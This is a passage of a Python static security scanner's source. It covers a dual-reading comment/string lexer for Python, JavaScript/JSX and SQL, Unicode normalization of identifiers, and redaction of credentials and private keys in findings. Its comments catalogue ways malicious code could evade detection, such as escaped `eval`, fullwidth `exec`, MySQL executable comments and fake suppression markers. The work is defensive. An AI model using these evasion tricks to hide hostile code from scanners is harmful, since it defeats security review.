# bundle opening with a `/*! lib | MIT */` banner, `/* x */ GRANT ALL … TO
# PUBLIC;` or a `  * eval(…)` continuation line were skipped by every rule.
# Comment state is now tracked ACROSS lines by a small lexer that knows the
# language's strings and comments; a line is a comment line only if every
# non-whitespace character on it is inside a comment.
#
# Fail closed where the same text reads two ways (review): a character is a
# comment only if BOTH readings of its language say so, so code that some
# runtime executes is never hidden as a comment, and a string can never pass
# for a comment holding a suppression marker. Each file is lexed twice and
# the comment spans (and, for JavaScript, the '…' "…" string spans; for
# SC-HOMOGLYPH, every literal's span) are intersected:
#   py : the lexer below, and again with f-strings (and t-strings) as
#        Python 3.12+ reads them (PEP 701): a replacement field may hold
#        strings in the same quotes, comments and newlines, and nothing in an
#        f-string is a comment. Python's own tokenizer is not used: it differs
#        across the supported versions (a comment line in a triple-quoted
#        f-string's field is a COMMENT on 3.12+ only; an unterminated string
#        ends a line on 3.10/3.11 and fails the whole file on 3.12+), and the
#        npm engine cannot run it.
#   js : the lexer below, and again reading JSX (not in .ts files, where
#        TypeScript parses none): in element text `//` and `/*` are text
#        (`<p>see /api/*</p>` opened a block comment that hid the rest of the
#        file) and attribute strings have no escapes; `{…}` holds code again.
#        An element starts at `<` + a tag name (or `>`) where an expression may
#        start: the regex positions below, after `default`, `)` or `]`. Text
#        no JSX toolchain accepts ends that reading at once (a `>` or `}` in
#        element text, anything but attributes in a tag), so a TypeScript
#        `<T>(x: T) => x` is code again at its `=>`.
#   sql: the lexer below (standard SQL), and again as MySQL reads it:
#        backslash escapes in '…' and "…", `…` quoted names, and `/*! … */`
#        (`/*M! … */`) is code MySQL executes (a mysqldump line
#        `('O\'Brien','src/*.js');` opened a comment that hid the next GRANT).
#
# Lexer semantics (mirrored by the JS engine):
#   py : '#' to end of line; '…' "…" end at end of line unless the newline is
#        backslash-escaped; '''…''' """…""" span lines; backslash escapes.
#   js : '//' to end of line; '/* … */' spans lines; '…' "…" as in py;
#        `…` template literals span lines (${…} is not re-lexed); a '/' that
#        starts a regex literal (previous significant code character is
#        start-of-file or one of ( , = : [ ! & | ? { } ; + - * % < > ~ ^, or
#        the previous word is return/typeof/instanceof/in/of/new/delete/void/
#        throw/case/do/else/yield/await) consumes the literal /…/ up to its
#        closing '/' on the same line (escapes and [classes] honoured); with no
#        closing '/' on the line it is a plain division, and so is every
#        later '/' on that line.
#   sql: '--' to end of line; '/* … */' spans lines; '…' and "…" span lines,
#        no backslash escapes ('' is two adjacent strings, same result).
#   other/unknown (lang None): '#' and '//' line comments, '/* … */', and
#        '…' "…" `…` strings ending at end of line (lexed once).
# Unterminated block comments and strings run to end of file.

_LEX_NEXT = {
    "py": re.compile(r"[#'\"]"),
    "js": re.compile(r"[/'\"`]"),
    "sql": re.compile(r"--|/\*|['\"]"),
    None: re.compile(r"#|/[/*]|['\"`]"),
}
_LEX_LINE_STR = {q: re.compile(q + r"(?:[^" + q + r"\\\n]|\\.)*" + q + "?", re.S)
                 for q in ("'", '"', "`")}
_LEX_STR = {
    ("py", "'"): _LEX_LINE_STR["'"], ("py", '"'): _LEX_LINE_STR['"'],
    ("py", "'''"): re.compile(r"'''(?:[^'\\]|\\.|'(?!''))*(?:'''|\Z)", re.S),
    ("py", '"""'): re.compile(r'"""(?:[^"\\]|\\.|"(?!""))*(?:"""|\Z)', re.S),
    ("js", "'"): _LEX_LINE_STR["'"], ("js", '"'): _LEX_LINE_STR['"'],
    ("js", "`"): re.compile(r"`(?:[^`\\]|\\.)*`?", re.S),
    ("sql", "'"): re.compile(r"'[^']*'?"), ("sql", '"'): re.compile(r'"[^"]*"?'),
    (None, "'"): _LEX_LINE_STR["'"], (None, '"'): _LEX_LINE_STR['"'],
    (None, "`"): _LEX_LINE_STR["`"],
}
# SQL as MySQL reads it
_LEX_MYSQL_NEXT = re.compile(r"--|/\*|['\"`]")
_LEX_MYSQL_STR = {"'": re.compile(r"'(?:[^'\\]|\\.)*'?", re.S),
                  '"': re.compile(r'"(?:[^"\\]|\\.)*"?', re.S),
                  "`": re.compile(r"`[^`]*`?")}
_JS_REGEX_LIT_RE = re.compile(r"/(?![*/])(?:[^/\\\[\n]|\\.|\[(?:[^\]\\\n]|\\.)*\])+/")
_JS_REGEX_PREV = frozenset("(,=:[!&|?{};+-*%<>~^")
_JS_REGEX_KEYWORDS = frozenset((
    "return", "typeof", "instanceof", "in", "of", "new", "delete", "void",
    "throw", "case", "do", "else", "yield", "await"))


def _is_word_char(ch):
    return ch.isalnum() or ch in "_$"


def _js_regex_allowed(prev, tail, keywords=_JS_REGEX_KEYWORDS):
    """May a '/' after this code start a regex literal? `prev` is the last
    significant code character ('' at start of file), `tail` the last few
    code characters ending at it."""
    if prev == "" or prev in _JS_REGEX_PREV:
        return True
    if _is_word_char(prev):
        k = len(tail)
        while k > 0 and _is_word_char(tail[k - 1]):
            k -= 1
        if k == 0 and len(tail) >= 11:     # word longer than any keyword
            return False
        return tail[k:] in keywords
    return False


def _intersect_spans(a, b):
    """The (start, end) spans covered by both `a` and `b` (each sorted and
    non-overlapping)."""
    out = []
    i = j = 0
    while i < len(a) and j < len(b):
        s = max(a[i][0], b[j][0])
        e = min(a[i][1], b[j][1])
        if s < e:
            out.append((s, e))
        if a[i][1] < b[j][1]:
            i += 1
        else:
            j += 1
    return out


def _lex_comment_spans(content, lang, strings=None, jsx=True, literals=None):
    """Absolute (start, end) spans of every comment in `content`: the spans
    both readings of the language agree on (see the lexer notes above).
    Linear: each reading finds the next interesting character with a regex
    and consumes strings and comments with bounded matches. If `strings`
    is a list, the '…' / "…" literal spans both JavaScript readings agree on
    are appended to it; if `literals` is, the spans of every literal both
    readings agree on: strings of any kind (f-strings, templates) and regex
    literals. jsx=False: a .ts file (no JSX reading)."""
    if lang == "cfg":                       # a config or data file (configsecrets)
        return configsecrets.comment_spans(content)
    lang = lang if lang in ("py", "js", "sql") else None
    if lang is None or (lang == "js" and not jsx):
        return _lex_pass(content, lang, strings, literals=literals)
    sa = None if strings is None else []
    sb = None if strings is None else []
    la = None if literals is None else []
    lb = None if literals is None else []
    a = _lex_pass(content, lang, sa, literals=la)
    b = (_lex_js_jsx(content, sb, lb) if lang == "js"
         else _lex_pass(content, lang, sb, second=True, literals=lb))
    if strings is not None:
        strings.extend(_intersect_spans(sa, sb))
    if literals is not None:
        literals.extend(_intersect_spans(la, lb))
    return _intersect_spans(a, b)


def _lex_pass(content, lang, strings=None, second=False, literals=None):
    """One reading of `content`: the lexer above, or with `second` the other
    reading of Python (PEP 701 f-strings) or SQL (MySQL)."""
    mysql = second and lang == "sql"
    nxt = _LEX_MYSQL_NEXT if mysql else _LEX_NEXT[lang]
    fstrings = second and lang == "py"
    spans = []
    n = len(content)
    pos = 0
    prev, tail = "", ""        # js: last significant code char / trailing code text
    no_regex_until = -1        # js: a regex literal failed to close before here
    while pos < n:
        m = nxt.search(content, pos)
        if m is None:
            break
        k = m.start()
        if lang == "js" and k > pos:
            seg = content[pos:k].rstrip()
            if seg:
                prev, tail = seg[-1], seg[-11:]
        ch = content[k]
        two = content[k:k + 2]
        if ((ch == "#" and lang in ("py", None)) or (two == "//" and lang in ("js", None))
                or (two == "--" and lang == "sql")):
            e = content.find("\n", k)
            e = n if e < 0 else e
            spans.append((k, e))
            pos = e
            continue
        if two == "/*" and lang != "py":
            if mysql and (content.startswith("!", k + 2) or content.startswith("M!", k + 2)):
                pos = k + 2                # MySQL executes /*! … */: its text is code
                continue
            e = content.find("*/", k + 2)
            e = n if e < 0 else e + 2
            spans.append((k, e))
            pos = e
            continue
        if ch == "/":                      # js only: regex literal or division
            if k >= no_regex_until and _js_regex_allowed(prev, tail):
                rm = _JS_REGEX_LIT_RE.match(content, k)
                if rm:
                    pos = rm.end()
                    prev, tail = '"', ""
                    if literals is not None:
                        literals.append((k, pos))
                    continue
                # no closing '/' on this line: the rest of the line holds no
                # regex literal either (one failed attempt per line keeps the
                # lexer linear on input like "=/[" repeated)
                no_regex_until = content.find("\n", k)
                no_regex_until = n if no_regex_until < 0 else no_regex_until
            pos = k + 1
            prev, tail = "/", "/"
            continue
        fstring, raw = _py_fstring_prefix(content, k) if fstrings else (False, False)
        if fstring:
            pos = _py_fstring_end(content, k, raw)
            if literals is not None:
                literals.append((k, pos))
            continue
        if mysql:
            sm = _LEX_MYSQL_STR[ch].match(content, k)
        else:
            key = ch * 3 if lang == "py" and content.startswith(ch * 3, k) else ch
            sm = _LEX_STR[(lang, key)].match(content, k)
        pos = max(sm.end() if sm else k + 1, k + 1)
        prev, tail = '"', ""
        if strings is not None and ch != "`":
            strings.append((k, pos))
        if literals is not None:
            literals.append((k, pos))
    return spans


# ---- Python f-strings as 3.12+ reads them (PEP 701) ----
_PY_FSTRING_PREFIXES = frozenset(("f", "fr", "rf", "t", "tr", "rt"))
_FSTR_TEXT_STOP = {q: re.compile("[{}\\\\\n" + q + "]") for q in ("'", '"')}
_FSTR_FIELD_STOP = re.compile(r"[#'\"(){}\[\]:]")


def _py_name_char(ch):
    """A character that may continue a Python name, for prefix purposes:
    ASCII letters, digits and '_', and every non-ASCII character."""
    return ch == "_" or not ch.isascii() or ch.isalnum()


def _py_fstring_prefix(s, k):
    """(is an f-/t-string, raw) for the string literal whose quote is at
    s[k]: the name characters right before the quote must be exactly a
    prefix (`if"x"` is a keyword and a plain string)."""
    j = k
    while j > 0 and k - j <= 2 and _py_name_char(s[j - 1]):
        j -= 1
    if k - j > 2 or (j > 0 and _py_name_char(s[j - 1])):
        return False, False
    p = s[j:k].lower()
    return p in _PY_FSTRING_PREFIXES, "r" in p


def _py_fstring_end(s, k, raw):
    """Index just past the f-string whose opening quote is at s[k], as the
    3.12+ tokenizer reads it: its replacement fields are code (strings in
    any quotes, comments, newlines, nested f-strings), a format spec ends at
    '}' or at the f-string's own closing quote, `{{` `}}` are text, a
    backslash hides the next character but not a brace, and `\\N{…}` is one
    escape. A single-quoted f-string also ends, unterminated, at a newline
    in its text; len(s) when nothing ends it."""
    n = len(s)
    q = s[k]
    ql = 3 if s.startswith(q * 3, k) else 1
    # frames: ["S", quote, qlen, raw] the text of an f-string; ["P", …] a
    # format spec (with its f-string's quote); ["F", depth, quote, qlen,
    # raw] a replacement field's code, depth counting ( [ {
    stack = [["S", q, ql, raw]]
    i = k + ql
    named = False                      # after \N{: the next '}' ends that escape
    while stack:
        fr = stack[-1]
        if fr[0] != "F":
            q, ql, rw = fr[1], fr[2], fr[3]
            m = _FSTR_TEXT_STOP[q].search(s, i)
            if m is None:
                return n
            i = m.start()
            c = s[i]
            if c == q:
                if ql == 3 and not s.startswith(q * 3, i):
                    i += 1
                    continue
                i += ql
                while stack.pop()[0] != "S":        # its fields and specs end with it
                    pass
                named = False
            elif c == "\n":
                if fr[0] == "P":
                    stack.pop()                     # a newline ends a format spec
                elif ql == 1:                       # unterminated: ends at the newline
                    while stack.pop()[0] != "S":
                        pass
                else:
                    i += 1
                named = False
            elif c == "\\":
                nx = s[i + 1:i + 2]
                if nx == "{" or nx == "}":
                    i += 1                          # the brace is read on its own
                elif not rw and nx == "N" and s.startswith("{", i + 2):
                    i += 3
                    named = True
                else:
                    i += 2
            elif c == "{":
                if fr[0] == "S" and s.startswith("{", i + 1):
                    i += 2                          # '{{'
                else:
                    stack.append(["F", 0, q, ql, rw])
                    i += 1
                named = False
            elif named:                             # '}' closing \N{…}
                named = False
                i += 1
            elif fr[0] == "P":
                stack.pop()                         # the field reads this '}'
            else:                                   # '}}', or a stray '}'
                i += 2 if s.startswith("}", i + 1) else 1
            continue
        m = _FSTR_FIELD_STOP.search(s, i)
        if m is None:
            return n
        i = m.start()
        c = s[i]
        if c == "#":                                # a comment: to end of line
            e = s.find("\n", i)
            if e < 0:
                return n
            i = e
        elif c == "'" or c == '"':
            is_f, sraw = _py_fstring_prefix(s, i)
            ql = 3 if s.startswith(c * 3, i) else 1
            if is_f:
                stack.append(["S", c, ql, sraw])
                i += ql
            else:
                sm = _LEX_STR[("py", c * ql)].match(s, i)
                i = max(sm.end() if sm else i + 1, i + 1)
        elif c in "([{":
            fr[1] += 1
            i += 1
        elif c == ")" or c == "]":
            fr[1] = max(fr[1] - 1, 0)
            i += 1
        elif c == "}":
            i += 1
            if fr[1]:
                fr[1] -= 1
            else:
                stack.pop()                         # the field ends
        else:                                       # ':'
            if not fr[1]:
                stack.append(["P", fr[2], fr[3], fr[4]])
            i += 1
    return i


# ---- JavaScript read as JSX ----
_JSX_JS_NEXT = re.compile(r"[/'\"`{}<]")
_JSX_FILE_NEXT = re.compile(r"[/'\"`<]")       # the file's own code: its braces need no count
_JSX_TEXT_NEXT = re.compile(r"[{}<>]")
_JSX_WS_RE = re.compile(r"[ \t\n\r\f\v]*")
_JSX_NAME_RE = re.compile(r"[A-Za-z0-9_$.:\-\x80-\U0010ffff]*")
_JSX_KEYWORDS = _JS_REGEX_KEYWORDS | {"default"}


def _jsx_name_start(ch):
    return ch.isascii() and (ch.isalpha() or ch in "_$") or not ch.isascii()


def _jsx_tag_at(s, j):
    """Where the tag name (or the '>' of a fragment) starts when a '<' ends
    just before s[j], else -1."""
    j = _JSX_WS_RE.match(s, j).end()
    if j < len(s) and (s[j] == ">" or _jsx_name_start(s[j])):
        return j
    return -1


def _lex_js_jsx(content, strings=None, literals=None):
    """JavaScript comment spans in the JSX reading (see the lexer notes):
    the base lexer, plus elements, whose text and attribute strings hold
    no comments and whose `{…}` hold code again."""
    spans = []
    n = len(content)
    pos = 0
    prev, tail = "", ""
    no_regex_until = -1
    # frames: ["js", depth] code (the bottom frame is the file, the others a
    # `{…}` inside JSX, depth counting its own braces); ["tag"] an opening
    # tag's attributes; ["text"] an element's children
    stack = [["js", 0]]

    def element_done():
        nonlocal prev, tail
        if stack[-1][0] == "js":
            prev, tail = '"', ""

    while pos < n:
        fr = stack[-1]
        kind = fr[0]
        if kind == "js":
            m = (_JSX_JS_NEXT if len(stack) > 1 else _JSX_FILE_NEXT).search(content, pos)
            if m is None:
                break
            k = m.start()
            if k > pos:
                seg = content[pos:k].rstrip()
                if seg:
                    prev, tail = seg[-1], seg[-11:]
            ch = content[k]
            two = content[k:k + 2]
            if two == "//":
                e = content.find("\n", k)
                e = n if e < 0 else e
                spans.append((k, e))
                pos = e
            elif two == "/*":
                e = content.find("*/", k + 2)
                e = n if e < 0 else e + 2
                spans.append((k, e))
                pos = e
            elif ch == "/":
                pos = k + 1
                if k >= no_regex_until and _js_regex_allowed(prev, tail):
                    rm = _JS_REGEX_LIT_RE.match(content, k)
                    if rm:
                        pos = rm.end()
                        prev, tail = '"', ""
                        if literals is not None:
                            literals.append((k, pos))
                        continue
                    no_regex_until = content.find("\n", k)
                    no_regex_until = n if no_regex_until < 0 else no_regex_until
                prev, tail = "/", "/"
            elif ch == "{":
                fr[1] += 1
                pos = k + 1
                prev, tail = "{", "{"
            elif ch == "}":
                pos = k + 1
                if fr[1]:
                    fr[1] -= 1
                elif len(stack) > 1:
                    stack.pop()                     # a `{…}` inside JSX ends
                    continue
                prev, tail = "}", "}"
            elif ch == "<":
                t = -1
                if prev in (")", "]") or _js_regex_allowed(prev, tail, _JSX_KEYWORDS):
                    t = _jsx_tag_at(content, k + 1)
                if t >= 0:
                    stack.append(["tag"])
                    pos = _JSX_NAME_RE.match(content, t).end()
                else:
                    pos = k + 1
                    prev, tail = "<", "<"
            else:                                   # a string or template literal
                sm = _LEX_STR[("js", ch)].match(content, k)
                pos = max(sm.end() if sm else k + 1, k + 1)
                prev, tail = '"', ""
                if strings is not None and ch != "`":
                    strings.append((k, pos))
                if literals is not None:
                    literals.append((k, pos))
            continue
        if kind == "tag":
            j = _JSX_WS_RE.match(content, pos).end()
            if j >= n:
                break
            c = content[j]
            two = content[j:j + 2]
            if two == "/>":
                stack.pop()
                pos = j + 2
                element_done()
                continue
            if c == ">":
                stack[-1] = ["text"]
                pos = j + 1
                continue
            if two == "//" or two == "/*":          # comments may sit between attributes
                e = content.find("\n" if two == "//" else "*/", j + 2)
                e = n if e < 0 else (e if two == "//" else e + 2)
                spans.append((j, e))
                pos = e
                continue
            if c == "{":
                stack.append(["js", 0])
                pos = j + 1
                prev, tail = "{", "{"
                continue
            if c == '"' or c == "'":                # no escapes in JSX attribute strings
                e = content.find(c, j + 1)
                e = n if e < 0 else e + 1
                if strings is not None:
                    strings.append((j, e))
                if literals is not None:
                    literals.append((j, e))
                pos = e
                continue
            if c == "=":
                pos = j + 1
                continue
            if _jsx_name_start(c):
                pos = _JSX_NAME_RE.match(content, j).end()
                continue
            t = _jsx_tag_at(content, j + 1) if c == "<" else -1
            if t >= 0:                              # an element as an attribute value
                stack.append(["tag"])
                pos = _JSX_NAME_RE.match(content, t).end()
                continue
            abort = j
        else:                                       # element text
            m = _JSX_TEXT_NEXT.search(content, pos)
            if m is None:
                break
            k = m.start()
            c = content[k]
            if c == "{":
                stack.append(["js", 0])
                pos = k + 1
                prev, tail = "{", "{"
                continue
            if c == "<":
                j = _JSX_WS_RE.match(content, k + 1).end()
                if content.startswith("/", j):      # a closing tag
                    j = _JSX_WS_RE.match(content, j + 1).end()
                    j = _JSX_NAME_RE.match(content, j).end()
                    j = _JSX_WS_RE.match(content, j).end()
                    if content.startswith(">", j):
                        stack.pop()
                        pos = j + 1
                        element_done()
                        continue
                else:
                    t = _jsx_tag_at(content, k + 1)
                    if t >= 0:
                        stack.append(["tag"])
                        pos = _JSX_NAME_RE.match(content, t).end()
                        continue
            abort = k
        # not JSX after all: back to the code around it, from this character
        while stack[-1][0] != "js":
            stack.pop()
        pos = abort
        prev, tail = "<", "<"
    return spans


def _line_starts(content):
    return [0] + [m.end() for m in re.finditer("\n", content)]


def _comment_spans(content, lang, strings=None, jsx=True, literals=None):
    return _lex_comment_spans(content, lang, strings, jsx, literals)


def _cut_spans(line, spans):
    """`line` without the text of `spans` (sorted, disjoint, relative to it)."""
    if not spans:
        return line
    parts, p = [], 0
    for a, b in spans:
        parts.append(line[p:a])
        p = b
    parts.append(line[p:])
    return "".join(parts)


def _comment_layout(content, lines, lang, strings=None, jsx=True, literals=None):
    """(mask, spans, code) for the lines of `content`:
    mask[i]  — line i is a comment line (has non-whitespace, all of it in comments);
    spans    — {i: [(start, end), …]} comment spans relative to line i;
    code     — line i with its comment text removed (strings kept).
    jsx=False: JavaScript without the JSX reading (a .ts file). `strings`,
    `literals`: lists the lexer's literal spans are appended to (see
    _lex_comment_spans)."""
    n = len(lines)
    mask = [False] * n
    by_line = {}
    spans = _comment_spans(content, lang, strings, jsx, literals)
    if not spans:
        return mask, by_line, lines
    starts = _line_starts(content)
    for s, e in spans:
        i = bisect.bisect_right(starts, s) - 1
        while i < n:
            ls = starts[i]
            le = ls + len(lines[i])
            a, b = max(s, ls) - ls, min(e, le) - ls
            if b > a:
                by_line.setdefault(i, []).append((a, b))
            if e <= le + 1:
                break
            i += 1
    code = list(lines)
    for i, sp in by_line.items():
        line = lines[i]
        parts, p = [], 0
        for a, b in sp:
            parts.append(line[p:a])
            p = b
        parts.append(line[p:])
        c = "".join(parts)
        code[i] = c
        mask[i] = not c.strip() and bool(line.strip())
    return mask, by_line, code


def comment_mask(lines, lang, jsx=True):
    """Per-line booleans: True for a comment line of this file (comment state
    carried across lines — see the lexer notes above). jsx=False for a .ts
    file (see jsx_reading)."""
    return _comment_layout("\n".join(lines), lines, lang, jsx=jsx)[0]


def jsx_reading(path):
    """Is a JavaScript-family file also read as JSX? Every one but .ts, .mts
    and .cts: TypeScript parses no JSX there (`<T>x` is a type assertion)."""
    return not str(path).lower().endswith((".ts", ".mts", ".cts"))


def is_comment(line, lang):
    """Single-line form of comment_mask() for callers without file context:
    the line is lexed on its own (no block comment or template open at its
    start). A ` * foo` line is therefore NOT a comment here — only
    comment_mask() over the whole file knows a block comment is open."""
    t = line.strip()
    if not t:
        return False
    if lang == "py":
        return t.startswith("#")
    return comment_mask([line], lang)[0]


def source_lines(content, lang):
    """content -> lines exactly as scan_file numbers them: CRLF/CR are
    normalized to LF, and for JavaScript U+2028/U+2029 (ECMAScript line
    terminators) also end a line."""
    content = normalize_newlines(content)
    if lang == "js" and ("\u2028" in content or "\u2029" in content):
        content = content.replace("\u2028", "\n").replace("\u2029", "\n")
    return content.split("\n")


# ---------------- Match text (review fix: shared semantics 5) ----------------
# Rules match each line in the form the language runtime reads it, so
# Unicode spellings of the same code cannot slip past ASCII patterns:
#   py : a line containing non-ASCII is matched in its NFKC-normalized form —
#        Python NFKC-normalizes identifiers, so `ｅｘｅｃ(…)` and
#        `os.ｓｙｓｔｅｍ(…)` run as exec / os.system;
#   js : identifier escapes \uXXXX and \u{X…} outside '…'/"…" string
#        literals are decoded when they denote an identifier character
#        (`\u0065val(` is eval), and U+FEFF — JavaScript whitespace that
#        Python's \s does not match — becomes a space (`eval\ufeff(`).
# Line numbers never change; snippets still show the original text.
_JS_UESC_RE = re.compile(r"\\u\{([0-9A-Fa-f]{1,6})\}|\\u([0-9A-Fa-f]{4})")


#: Identifier characters since Unicode 15.1 only (ZWNJ, ZWJ and the two
#: katakana middle dots): Python 3.13+ and current Node say so, 3.10-3.12 not.
_LATER_ID_CONTINUE = frozenset("\u200c\u200d\u30fb\uff65")


def _js_ident_char(m):
    """The identifier character a JS \\u escape denotes, else None: the same
    on every Python and Node (Unicode 13.0's characters, see _unicode13)."""
    cp = int(m.group(1) or m.group(2), 16)
    if cp > 0x10FFFF:
        return None
    ch = chr(cp)
    if ch == "$" or ch in _LATER_ID_CONTINUE:
        return ch
    return ch if _unicode13.assigned(cp) and ("a" + ch).isidentifier() else None


def _py_match_text(text):
    return text if text.isascii() else unicodedata.normalize("NFKC", text)


class _ScanBudgetExceeded(Exception):
    """Raised inside scan_file when the per-file time budget is spent."""


_TLS = threading.local()      # the scan_file context active on this thread


class _Redactor:
    """One file's redaction facts, shared by every snippet built from its
    lines: the lines of its PEM private-key blocks, its entropy literals
    (_SecretLiterals) and each line as any snippet may show it. scan_file's
    context is one; encoding_issues and redact_file_issues build their own,
    so a finding made outside scan_file redacts the file's secrets too."""

    def __init__(self, lines):
        self.lines = lines
        self._red = {}
        self._pem = None
        self._secrets = None

    def secrets(self):
        """This file's entropy-flagged literals (see _SecretLiterals)."""
        if self._secrets is None:
            self._secrets = _SecretLiterals(self.lines)
        return self._secrets

    def redacted(self, k):
        """Line k as any snippet may show it: whole-line [redacted] inside a
        PEM key block, else with secret patterns and this file's entropy
        literals replaced. Computed once per line, not once per finding
        whose snippet shows it (review: 3000 findings on one 45 KB line
        re-ran the redaction 15000 times)."""
        r = self._red.get(k)
        if r is None:
            if self._pem is None:
                self._pem = _pem_block_lines(self.lines)
            if k in self._pem:
                r = REDACTED
            else:
                r = self.secrets().redact(_redact_context_line(self.lines[k]))
            self._red[k] = r
        return r


class _FileCtx(_Redactor):
    """Per-file facts computed once and shared by every rule, the suppression
    check and mk_issue: the comment layout, the normalized match text of each
    line, parsed suppression markers and the redaction caches."""

    def __init__(self, lines, lang, content=None, deadline=None, jsx=True):
        super().__init__(lines)
        self.lang = lang
        self.content = "\n".join(lines) if content is None else content
        self._strings = [] if lang == "js" else None      # '…' "…" spans (absolute)
        self._literals = [] if lang in ("js", "py") else None   # every literal's span (absolute)
        self.cmask, self.cspans, self.code = _comment_layout(
            self.content, lines, lang, self._strings, jsx, self._literals)
        self.deadline = deadline
        self._markers = {}
        self._mlines = None
        self._mcode = {}
        self._starts = None
        self._str_starts = None
        self._lit_ends = None

    @property
    def mlines(self):
        """The text each line is matched in (see "Match text" above)."""
        if self._mlines is None:
            if self.lang == "py":
                self._mlines = [_py_match_text(l) for l in self.lines]
            elif self.lang == "js":
                self._mlines = [self._js_text(i, False) for i in range(len(self.lines))]
            else:
                self._mlines = self.lines
        return self._mlines

    def mcode(self, i):
        """Match text of line i with its comment text removed."""
        if self.code is self.lines:
            return self.mlines[i]
        v = self._mcode.get(i)
        if v is None:
            if self.lang == "py":
                v = _py_match_text(self.code[i])
            elif self.lang == "js":
                v = self._js_text(i, True)
            else:
                v = self.code[i]
            self._mcode[i] = v
        return v

    def names_code(self, i):
        """Line i as names are read in it (SC-HOMOGLYPH): its match text
        with its comments removed and every literal blanked, by the spans
        both readings of the file agree on: strings of any kind (a template
        or f-string with its fields), regex literals. So a regex's
        escapes are not decoded into names (ajv's /http[s\\u017F]?/), a
        character class like [a-z\\u0430-\\u044f] and a docstring's lines are
        not names, and a quote escaped in a string ends nothing."""
        line = self.lines[i]
        if self._literals is None:
            return self.mcode(i)
        if self._starts is None:
            self._starts = _line_starts(self.content)
        if self._lit_ends is None:
            self._lit_ends = [e for _, e in self._literals]
        base = self._starts[i]
        end = base + len(line)
        k = bisect.bisect_right(self._lit_ends, base)       # the first literal ending after base
        parts, p = [], 0
        while k < len(self._literals) and self._literals[k][0] < end:
            a, b = max(self._literals[k][0], base) - base, min(self._literals[k][1], end) - base
            parts.append(line[p:a])
            parts.append(" " * (b - a))
            p = b
            k += 1
        if not parts:
            return self.mcode(i)
        parts.append(line[p:])
        blanked = "".join(parts)
        if self.lang == "js":
            return self._js_text(i, True, blanked)
        return _py_match_text(_cut_spans(blanked, self.cspans.get(i, ())))

    def _js_text(self, i, drop_comments, line=None):
        """Line i's match text; `line`: line i with some of its text blanked
        (the same length) to read instead."""
        if line is None:
            line = self.lines[i]
            plain = self.code[i] if drop_comments else line
        else:
            plain = _cut_spans(line, self.cspans.get(i, ())) if drop_comments else line
        if "\\u" not in line:
            return plain.replace("\ufeff", " ") if "\ufeff" in plain else plain
        if self._starts is None:
            self._starts = _line_starts(self.content)
        if self._str_starts is None:
            self._str_starts = [a for a, _ in self._strings]
        base = self._starts[i]
        cuts = list(self.cspans.get(i, ())) if drop_comments else []
        edits = [(a, b, "") for a, b in cuts]
        c, ncuts = 0, len(cuts)             # cuts are sorted: one moving index
        for m in _JS_UESC_RE.finditer(line):
            while c < ncuts and cuts[c][1] <= m.start():
                c += 1
            if c < ncuts and cuts[c][0] <= m.start():
                continue
            k = bisect.bisect_right(self._str_starts, base + m.start()) - 1
            if k >= 0 and self._strings[k][1] > base + m.start():
                continue                          # inside a '…' or "…" literal
            ch = _js_ident_char(m)
            if ch is not None:
                edits.append((m.start(), m.end(), ch))
        if not edits:
            out = plain
        else:
            edits.sort()
            parts, p = [], 0
            for a, b, rep_ in edits:
                if a < p:
                    continue
                parts.append(line[p:a])
                parts.append(rep_)
                p = b
            parts.append(line[p:])
            out = "".join(parts)
        return out.replace("\ufeff", " ") if "\ufeff" in out else out

    def marker(self, k):
        """Parsed suppression marker of line k: _NO_MARKER, None (blanket)
        or a frozenset of rule IDs. Parsed once per line."""
        v = self._markers.get(k, self)
        if v is self:
            m = _find_marker(self.lines[k], self.cspans.get(k))
            v = _NO_MARKER if m is None else _marker_rules(m)
            self._markers[k] = v
        return v

    def suppressed(self, issue, dep=False):
        if dep or str(issue.get("rule", "")).startswith(UNSUPPRESSIBLE_PREFIXES):
            return False
        return _suppressed_in(issue, self)

    def check_time(self):
        if self.deadline is not None and time.monotonic() > self.deadline:
            raise _ScanBudgetExceeded()


class _ConfigCtx(_FileCtx):
    """A config file's context (scan_config_file): a line any snippet shows
    also has the value of every credential-named key redacted — a .env's
    `DB_PASS=hunter2` matches none of the code patterns."""

    def redacted(self, k):
        r = self._red.get(k)
        if r is None:
            if self._pem is None:
                self._pem = _pem_block_lines(self.lines)
            if k in self._pem:
                r = REDACTED
            else:
                r = self.secrets().redact(
                    _redact_context_line(configsecrets.redact_values(self.lines[k])))
            self._red[k] = r
        return r


def _active_ctx(lines):
    ctx = getattr(_TLS, "ctx", None)
    return ctx if ctx is not None and ctx.lines is lines else None

# Line-level matchers for redacting credentials that appear on CONTEXT lines
# of a snippet (audit L1: a finding's ±2-line context can carry a DIFFERENT
# secret than the one flagged — e.g. an S-SECRET at line 3 whose context
# window includes the AWS key at line 4). Secret rules whose regex has no
# "skip" noise filter run raw; S-SECRET re-uses its own assignment regex so
# the same detection contract applies on context lines.
_SECRET_LINE_PATTERNS = [
    # provider token formats (S-TOKEN's list, plus fine-grained github_pat_);
    # a PEM private-key header is redacted through its END marker or, when
    # the key continues on later lines, to end of line (see _pem_block_lines).
    # Linear-time matcher, text in _TOKEN_REDACT_ALTS (see _TokenPattern).
    _TOKEN_REDACT_PATTERN,
    # SQL credentials — case-insensitive like the SQL-CRED rule (review fix:
    # lowercase `identified by '…'` leaked through other findings' context)
    re.compile(r"(?:IDENTIFIED\s+BY\s+['\"][^'\"]+['\"]|PASSWORD\s*=?\s*['\"][^'\"]+['\"]"
               r"|IDENTIFIED\s+BY\s+PASSWORD)", re.I),
    re.compile(r"(?:password|passwd|pwd|secret|api[_-]?key|access[_-]?key|auth[_-]?token|"
               r"private[_-]?key)\s*[:=]\s*[\"'][^\"']{4,}[\"']", re.I),
    # credentials in a URL's userinfo: scheme://user:password@host, scheme://token@host
    re.compile(r"(?<=://)[^/\s@'\"]+(?=@)"),
]
REDACTED = "[redacted]"
_PEM_BEGIN_RE = re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----")
_PEM_END_RE = re.compile(r"-----END [A-Z ]*PRIVATE KEY-----")


def _redact_context_line(line):
    """Replace every credential-looking match on a context line with
    [redacted], preserving surrounding code. Returns the new line, or the
    original line if nothing matched."""
    out = line
    for pat in _SECRET_LINE_PATTERNS:
        out = pat.sub(REDACTED, out)
    return out


def _pem_block_lines(lines):
    """Indices of the lines of multi-line PEM private keys that follow the
    BEGIN line, through the END line — or through the last line when no END
    follows (review fix: an S-TOKEN on `-----BEGIN RSA PRIVATE KEY-----`
    redacted the header while the next two key lines shipped in its
    snippet). Such lines are redacted whole; the BEGIN line itself is
    handled by the pattern list."""
    out = set()
    inside = False
    for k, line in enumerate(lines):
